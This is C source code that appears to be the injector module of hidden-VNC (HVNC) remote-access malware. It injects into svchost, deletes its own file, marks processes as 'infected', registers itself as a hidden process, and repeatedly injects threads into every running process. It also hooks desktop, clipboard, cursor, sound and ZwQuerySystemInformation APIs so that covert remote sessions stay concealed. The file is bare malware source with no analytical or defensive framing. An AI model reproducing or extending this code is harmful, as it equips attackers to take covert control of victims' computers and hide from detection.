#include <windows.h>
#include <shlwapi.h>
#include <ntdll.h>
#include <syslib.h>
#include <hvnc.h>
#include <ntdll.h>
#include <tlhelp32.h>
#include "..\svchost_inj.h"
#include "..\func.h"
#include "..\crashrpt.h"
#include "..\defines.h"
#include "..\bot\system.h"
#include "inj.h"
#include <Uxtheme.h>

WCHAR szHvncName[MAX_PATH];

void WINAPI StarterThread(LPVOID tmp)
{
    ldr_RebasePE();
    STARTUPINFOW siInfo={0};
    PROCESS_INFORMATION piInfo={0};
    siInfo.cb=sizeof(siInfo);
    CreateProcessW(NULL,szHvncName,NULL,NULL,false,NULL,NULL,NULL,&siInfo,&piInfo);
    ExitThread(0);
}

void InitVNCHooks(VNC_HOOKS *lpVNCHooks)
{
    addhook(lpVNCHooks,OpenDesktopA);
    addhook(lpVNCHooks,OpenDesktopW);
    addhook(lpVNCHooks,OpenInputDesktop);
    addhook(lpVNCHooks,SwitchDesktop);

    addhook(lpVNCHooks,PlaySoundW);
    addhook(lpVNCHooks,PlaySoundA);
    addhook(lpVNCHooks,sndPlaySoundW);
    addhook(lpVNCHooks,sndPlaySoundA);
    addhook(lpVNCHooks,Beep);
    addhook(lpVNCHooks,MessageBeep);
    addhook(lpVNCHooks,waveOutOpen);

    LPVOID GetUpdatedClipboardFormats=GetProcAddress(GetModuleHandle(_T("user32")),"GetUpdatedClipboardFormats");;
    addhook(lpVNCHooks,CloseClipboard);
    addhook(lpVNCHooks,CountClipboardFormats);
    addhook(lpVNCHooks,EmptyClipboard);
    addhook(lpVNCHooks,GetClipboardData);
    addhook(lpVNCHooks,GetPriorityClipboardFormat);
    addhook(lpVNCHooks,IsClipboardFormatAvailable);
    addhook(lpVNCHooks,OpenClipboard);
    addhook(lpVNCHooks,SetClipboardData);

    addhook(lpVNCHooks,FlashWindowEx);
    addhook(lpVNCHooks,FlashWindow);
    addhook(lpVNCHooks,GetCursorPos);
    addhook(lpVNCHooks,SetCursorPos);
    addhook(lpVNCHooks,GetMessagePos);
    addhook(lpVNCHooks,SetCapture);
    addhook(lpVNCHooks,ReleaseCapture);
    addhook(lpVNCHooks,GetCapture);
    addhook(lpVNCHooks,DefWindowProcW);
    addhook(lpVNCHooks,DefWindowProcA);
    addhook(lpVNCHooks,DefDlgProcW);
    addhook(lpVNCHooks,DefDlgProcA);
    addhook(lpVNCHooks,DefFrameProcW);
    addhook(lpVNCHooks,DefFrameProcA);
    addhook(lpVNCHooks,DefMDIChildProcW);
    addhook(lpVNCHooks,DefMDIChildProcA);
    addhook(lpVNCHooks,CallWindowProcW);
    addhook(lpVNCHooks,CallWindowProcA);
    addhook(lpVNCHooks,GetMessageW);
    addhook(lpVNCHooks,GetMessageA);
    addhook(lpVNCHooks,PeekMessageW);
    addhook(lpVNCHooks,PeekMessageA);
    addhook(lpVNCHooks,SetDIBitsToDevice);

    addhook(lpVNCHooks,TrackPopupMenuEx);

    addhook(lpVNCHooks,GetCaretBlinkTime);
    return;
}

void InitCommonHooks(COMMON_HOOKS *lpCommonHooks)
{
    addhook(lpCommonHooks,SetThreadDesktop);
    addhook(lpCommonHooks,ZwQuerySystemInformation);
    addhook(lpCommonHooks,ShowWindow);
    return;
}

void RemoveCommonHooks()
{
    UnhookAll();
    return;
}

extern bool bCrashRptInit,bInitApiHook;
void WINAPI RemThread(void *)
{
    ldr_RebasePE();
    MemInit();
    HANDLE hMarkerMutex=MarkProcessAsInfected(GetCurrentProcessId());
    bInitApiHook=false;
    InitAPIHook();
    bCrashRptInit=false;
    InitCrashRpt();

    RemoteThread(NULL);
#ifndef _DEBUG
    SetUnhandledExceptionFilter(lpLastFilter);
#endif
    DestroyInject();
}

extern bool bInitInjector;
char szSelfNameA[MAX_PATH];

void WINAPI svchost_thread(void *tmp)
{
    ldr_RebasePE();

    InjLibInit();
    HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,false,szEvent);
    SetEvent(hEvent);
    SysCloseHandle(hEvent);

    RemoveFileA(szSelfNameA);

    MemInit();
    InitCrashRpt();
    bInitInjector=false;
    InitInjector(NULL);

    MarkProcessAsInfected(GetCurrentProcessId());
    RegisterHiddenProcess();

    while (HVNCInjLibIsAlive(PROCLIST_INJECT_TIMEOUT))
    {
        HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        PROCESSENTRY32 ppe={0};
        ppe.dwSize=sizeof(PROCESSENTRY32);
        Process32First(hSnap,&ppe);
        do
            InjectProc(RemThread,ppe.th32ProcessID,NULL);
        while (Process32Next(hSnap,&ppe));
        SysCloseHandle(hSnap);
    }
    ExitProcess(0);
}

void main()
{
    MemInit();
    InitInjector(NULL);

    int argc=0;
    LPWSTR *argv=CommandLineToArgvW(GetCommandLineW(),&argc);
    if (argc == 3)
    {
        wsprintfW(szHvncName,L"\"%s\"",argv[2]);
        InjectProc(StarterThread,StrToIntW(argv[1]),NULL);
    }
    else
    {
        GetModuleFileNameA(NULL,szSelfNameA,countof(szSelfNameA));
        if (!InjectSVCHost(svchost_thread))
            svchost_thread(0);
    }
    ExitProcess(0);
}


